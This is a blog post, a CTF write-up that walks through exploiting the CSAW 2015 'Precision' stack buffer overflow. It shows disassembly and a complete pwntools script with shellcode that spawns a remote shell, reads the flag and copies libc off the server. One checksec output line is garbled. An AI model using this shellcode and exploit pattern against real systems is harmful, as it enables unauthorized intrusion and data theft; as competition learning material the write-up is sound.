<!DOCTYPE html>
<html>

  <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <title>CSAW CTF 2015 - Precision</title>
  <meta name="description" content="TL; DR  Overflow">

  <link href='https://fonts.googleapis.com/css?family=Open+Sans:600,700|Droid+Serif:400,700' rel='stylesheet' type='text/css'>
  
  <link rel="stylesheet" href="/css/main.css">
  <link rel="canonical" href="http://localhost:4000/ctf/exploit/overflow/2015/09/28/csaw-ctf-precision/">
  <link rel="alternate" type="application/rss+xml" title="Hello, and Thanks for All the Fish" href="http://localhost:4000/feed.xml">
</head>


  <body>
    <div class="site-wrap">
      <header class="site-header">
  <div class="wrapper">
    <a class="site-title" href="http://localhost:4000/">Hello, and Thanks for All the Fish</a>

    <nav class="site-nav">
      <a href="#" class="menu-icon">
        <svg viewBox="0 0 18 15">
          <path fill="#424242" d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.031C17.335,0,18,0.665,18,1.484L18,1.484z"/>
          <path fill="#424242" d="M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0c0-0.82,0.665-1.484,1.484-1.484 h15.031C17.335,6.031,18,6.696,18,7.516L18,7.516z"/>
          <path fill="#424242" d="M18,13.516C18,14.335,17.335,15,16.516,15H1.484C0.665,15,0,14.335,0,13.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.031C17.335,12.031,18,12.696,18,13.516L18,13.516z"/>
        </svg>
      </a>

      <div class="trigger">
        
          
          <a class="page-link" href="/about/">About</a>
          
        
          
        
          
        
          
        
          
        

        <a href="/feed.xml" class="page-link">RSS</a>
      </div>
    </nav>
  </div>
</header>


      <div class="page-content">
        <div class="wrapper">
          <article class="post" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title" itemprop="name headline">CSAW CTF 2015 - Precision</h1>
    <p class="post-meta"><time datetime="2015-09-28T05:00:00-07:00" itemprop="datePublished">September 28, 2015</time></p>
  </header>

  <div class="post-content" itemprop="articleBody">
    <h3 id="tl-dr">TL; DR</h3>
<ul>
  <li>Overflow</li>
</ul>

<p>Precision was the lowest point exploitation challenge because it was literally a buffer overflow :3</p>

<p>Let’s start by getting an idea what is up with it:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">vagrant@precise64:~/csawctf$ </span>file precision
prec: ELF 32-bit LSB executable, Intel 80386, version 1 <span class="o">(</span>SYSV<span class="o">)</span>, dynamically linked <span class="o">(</span>uses shared libs<span class="o">)</span>, <span class="k">for </span>GNU/Linux 2.6.24, BuildID[sha1]<span class="o">=</span>0xf2c69f92c3f6d68319ee39c0926e84bccdeb0371, not stripped</code></pre></figure>

<p>Alright, and the security mitigations it has:</p>

<figure class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="gp">vagrant@precise64:~/csawctf$ </span>~/Template/checksec.sh --file precision
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   precfound      NX enabled    No PIE          No RPATH   No RUNPATH   contacts</code></pre></figure>

<p>Oh boy! No NX! So we can put shellcode into our payload :3</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">804856</span><span class="n">f</span><span class="o">:</span>       <span class="k">lea</span>    <span class="n">eax</span><span class="p">,</span><span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x18</span><span class="err">]</span>
<span class="mi">8048573</span><span class="o">:</span>       <span class="k">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x4</span><span class="err">]</span><span class="p">,</span><span class="n">eax</span>     <span class="c">; Our input</span>
<span class="mi">8048577</span><span class="o">:</span>       <span class="k">mov</span>    <span class="n">DWORD</span> <span class="n">PTR</span> <span class="p">[esp],</span><span class="mh">0x8048682</span>   <span class="c">; Scanf format string</span>
<span class="mi">804857</span><span class="n">e</span><span class="o">:</span>       <span class="k">call</span>   <span class="mi">8048410</span> <span class="o">&lt;</span><span class="n">__isoc99_scanf</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span></code></pre></figure>

<p>Oh man, we have a <code class="highlighter-rouge">scanf</code> that prompts us for our input and stores it in a static buffer.</p>

<p>If we look at the function prologue, we get an idea how big this buffer is:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">8048523</span><span class="o">:</span>       <span class="k">sub</span>    <span class="n">esp</span><span class="p">,</span><span class="mh">0xa0</span> <span class="c">; Our return address will be around 0xa0 bytes</span></code></pre></figure>

<p>The interesting part of this challenge comes from this part of <code class="highlighter-rouge">main</code>:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">8048583</span><span class="o">:</span>       <span class="k">fld</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x98</span><span class="err">]</span>
<span class="mi">804858</span><span class="n">a</span><span class="o">:</span>       <span class="k">fld</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="n">ds</span><span class="o">:</span><span class="mh">0x8048690</span>
<span class="mi">8048590</span><span class="o">:</span>       <span class="k">fucomip</span> <span class="n">st</span><span class="p">,</span><span class="n">st</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="mi">8048592</span><span class="o">:</span>       <span class="k">fstp</span>   <span class="n">st</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="mi">8048594</span><span class="o">:</span>       <span class="k">jp</span>     <span class="mi">80485</span><span class="n">a9</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mh">0x8c</span><span class="o">&gt;</span>
<span class="mi">8048596</span><span class="o">:</span>       <span class="k">fld</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x98</span><span class="err">]</span>
<span class="mi">804859</span><span class="n">d</span><span class="o">:</span>       <span class="k">fld</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="n">ds</span><span class="o">:</span><span class="mh">0x8048690</span>
<span class="mi">80485</span><span class="n">a3</span><span class="o">:</span>       <span class="k">fucomip</span> <span class="n">st</span><span class="p">,</span><span class="n">st</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="mi">80485</span><span class="n">a5</span><span class="o">:</span>       <span class="k">fstp</span>   <span class="n">st</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="mi">80485</span><span class="n">a7</span><span class="o">:</span>       <span class="k">je</span>     <span class="mi">80485</span><span class="n">c1</span> <span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mh">0xa4</span><span class="o">&gt;</span></code></pre></figure>

<p>We see a lot of floating point operations and at the beginning of that code we see a floating point load from <code class="highlighter-rouge">0x8048690</code>. Looking at the beginning of this function we see the same address again:</p>

<figure class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="mi">8048529</span><span class="o">:</span>       <span class="k">fld</span>    <span class="n">QWORD</span> <span class="n">PTR</span> <span class="n">ds</span><span class="o">:</span><span class="mh">0x8048690</span>
<span class="mi">804852</span><span class="n">f</span><span class="o">:</span>       <span class="k">fstp</span>   <span class="n">QWORD</span> <span class="n">PTR</span> <span class="err">[</span><span class="n">esp</span><span class="o">+</span><span class="mh">0x98</span><span class="err">]</span></code></pre></figure>

<p>and it is storing the value in a stack based variable meaning it is most likely using this floating point value as a “stack cookie” more or less. So by simply getting the bytes of this floating point value and sticking them into our payload at the right offset as to align them with where the floating point value is located, we pass this check and get our exploit to land :3</p>

<p>Oh yeah, they also give us the address of our buffer in memory, so it is super easy peasy :3</p>

<h3 id="note">Note</h3>
<p>This script also includes an example of how to exfiltrate a libc in case you need it for a higher point problem :3</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">"54.173.98.115"</span><span class="p">,</span> <span class="mi">1259</span><span class="p">)</span>


<span class="n">shellcode</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xeb\x25\x5e\x31\xc9\xb1\x1e\x80\x3e\x07\x7c\x05\x80\x2e\x07\xeb\x11\x31\xdb\x31\xd2\xb3\x07\xb2\xff\x66\x42\x2a\x1e\x66\x29\xda\x88\x16\x46\xe2\xe2\xeb\x05\xe8\xd6\xff\xff\xff\x38\xc7\x57\x6f\x69\x68\x7a\x6f\x6f\x69\x70\x75\x36\x6f\x36\x36\x36\x36\x90\xea\x57\x90\xe9\x5a\x90\xe8\xb7\x12\xd4\x87</span><span class="s">"</span>

<span class="n">buf</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="o">.</span><span class="n">recvline</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()[</span><span class="o">-</span><span class="mi">8</span><span class="p">:],</span> <span class="mi">16</span><span class="p">)</span>

<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"A"</span><span class="o">*</span><span class="p">(</span><span class="mh">0x80</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">))</span> <span class="o">+</span> <span class="n">shellcode</span> <span class="o">+</span> <span class="s">"</span><span class="se">\xA5\x31\x5A\x47\x55\x15\x50\x40</span><span class="s">EEEECCCCDDDD"</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">buf</span><span class="o">+</span><span class="mi">8</span><span class="p">))</span>
<span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"cat flag.txt"</span><span class="p">)</span>
<span class="k">print</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="n">r</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"cat /lib32/libc.so.6"</span><span class="p">)</span>

<span class="n">x</span> <span class="o">=</span> <span class="s">""</span>
<span class="k">while</span> <span class="n">r</span><span class="o">.</span><span class="n">can_recv</span><span class="p">(</span><span class="mi">5</span><span class="p">):</span>
    <span class="n">x</span> <span class="o">+=</span> <span class="n">r</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>

<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">"libc"</span><span class="p">,</span> <span class="s">"wb"</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
    <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">x</span><span class="p">)</span></code></pre></figure>


  </div>

</article>

        </div>
      </div>

      <footer class="site-footer">
  <div class="wrapper">
    <div class="footer-col-wrapper">
      <div class="footer-col footer-col-1">
        <div class="social-media-list">
          
            <a href="mailto:chris@vgcs.io">Email</a>
          

          
            <a href="https://github.com/breadchris">Github</a>
          

          
            <a href="https://twitter.com/breadchris">Twitter</a>
          
        </div>
      </div>

      <div class="footer-col footer-col-2">
        <p>Theme made by <a href="http://masha.space/">Masha Safina</a>. Codes available on <a href="https://github.com/mashlo/captains-log">GitHub</a> 🖖</p>
      </div>
    </div>
  </div>
</footer>

    </div>
  </body>

</html>
